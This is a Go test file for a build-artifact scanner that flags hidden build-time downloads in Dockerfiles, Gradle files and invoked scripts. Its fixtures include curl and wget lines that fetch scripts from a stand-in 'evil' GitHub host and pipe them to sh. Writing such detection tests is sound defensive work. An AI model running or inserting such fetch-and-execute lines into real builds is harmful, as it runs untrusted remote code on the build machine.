package forbidden

import (
	"os"
	"path/filepath"
	"testing"
)

func write(t *testing.T, root, rel, content string) {
	t.Helper()
	path := filepath.Join(root, rel)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", rel, err)
	}
}

// A clean Go artifact (Dockerfile + go.mod, no hidden downloads) yields no findings.
func TestScanCleanArtifact(t *testing.T) {
	root := t.TempDir()
	write(t, root, "Dockerfile", "FROM golang:1.26\nWORKDIR /work\n")
	write(t, root, "go.mod", "module semdev.test/app\n\ngo 1.26\n")
	write(t, root, "app.go", "package app\n\nfunc Add(a, b int) int { return a + b }\n")

	findings, err := Scan(root)
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("clean artifact yielded findings: %+v", findings)
	}
}

// A Dockerfile that fetches from a raw URL at build time is a hidden download that dodges
// the cold-resolution proof — the exact SB3 tripwire (semspec's substitution vector).
func TestScanCatchesRawURLFetchInDockerfile(t *testing.T) {
	root := t.TempDir()
	write(t, root, "Dockerfile", "FROM golang:1.26\nRUN curl -sL https://raw.githubusercontent.com/evil/x/main/patch.sh | sh\nWORKDIR /work\n")
	write(t, root, "go.mod", "module semdev.test/app\n\ngo 1.26\n")

	findings, err := Scan(root)
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if len(findings) != 1 {
		t.Fatalf("want exactly 1 finding, got %d: %+v", len(findings), findings)
	}
	f := findings[0]
	if f.File != "Dockerfile" || f.Pattern != "raw.githubusercontent.com" || f.Line != 2 {
		t.Errorf("finding = %+v, want Dockerfile:2 raw.githubusercontent.com", f)
	}
	if Detail(findings) == "" {
		t.Error("Detail must render a non-empty operator line for findings")
	}
}

// The banned semdev network tools in a build script are caught (case-insensitively), in a
// Gradle build script (matched by extension, not a fixed basename).
func TestScanCatchesNetworkToolsAndGradle(t *testing.T) {
	root := t.TempDir()
	write(t, root, "app/build.gradle", "dependencies {\n  // fetched via HTTP_REQUEST at configuration time\n}\n")
	write(t, root, "settings.gradle", "rootProject.name = 'x'\n")

	findings, err := Scan(root)
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if len(findings) != 1 {
		t.Fatalf("want 1 finding (the gradle http_request), got %d: %+v", len(findings), findings)
	}
	if findings[0].Pattern != "http_request" || findings[0].File != filepath.Join("app", "build.gradle") {
		t.Errorf("finding = %+v, want app/build.gradle http_request", findings[0])
	}
}

// The SCRIPT-INDIRECTION close (the semspec init.d class): a Dockerfile that RUNs a
// committed script whose body curls a raw URL is caught — the fetch is in the script, not
// the Dockerfile line, and since the cold container is networked the fetch would otherwise
// succeed cold and slip through. Scanning invoked scripts is the sole control for this.
func TestScanCatchesFetchSmuggledIntoInvokedScript(t *testing.T) {
	root := t.TempDir()
	// The Dockerfile line is clean — it just runs a committed script.
	write(t, root, "Dockerfile", "FROM golang:1.26\nCOPY scripts/ /scripts/\nRUN /scripts/setup.sh\nWORKDIR /work\n")
	// The fetch hides in the script.
	write(t, root, "scripts/setup.sh", "#!/bin/sh\ncurl -sL https://raw.githubusercontent.com/evil/x/main/seed.sh | sh\n")
	write(t, root, "go.mod", "module semdev.test/app\n\ngo 1.26\n")

	findings, err := Scan(root)
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if len(findings) != 1 || findings[0].File != filepath.Join("scripts", "setup.sh") {
		t.Fatalf("want the fetch caught in scripts/setup.sh, got %+v", findings)
	}
}

// Build-file basenames under vendored/test/tooling dirs are NOT the artifact's own build
// declarations — scanning them only raises false-parks, so they are skipped.
func TestScanSkipsVendorAndTestdata(t *testing.T) {
	root := t.TempDir()
	write(t, root, "Dockerfile", "FROM golang:1.26\nWORKDIR /work\n")
	// A vendored dep and a test fixture each carry a raw-URL build file — not the
	// artifact's own build step, so not a finding.
	write(t, root, "vendor/example.com/dep/Dockerfile", "FROM scratch\nRUN wget https://raw.githubusercontent.com/x/y/z\n")
	write(t, root, "testdata/case1/build.gradle", "// http_request here\n")

	findings, err := Scan(root)
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("vendored/testdata build files must be skipped, got %+v", findings)
	}
}

// A forbidden pattern in a NON-build file (source, a test fixture, a doc) is NOT a finding
// — the tripwire is about build-time fetches, not any mention of a URL anywhere.
func TestScanIgnoresNonBuildFiles(t *testing.T) {
	root := t.TempDir()
	write(t, root, "Dockerfile", "FROM golang:1.26\nWORKDIR /work\n")
	write(t, root, "client.go", "package app\n\nconst docsURL = \"https://raw.githubusercontent.com/org/repo/main/README.md\"\n")
	write(t, root, "README.md", "See https://raw.githubusercontent.com/org/repo for details.\n")

	findings, err := Scan(root)
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("a URL in source/docs must not trip the build-file scanner: %+v", findings)
	}
}
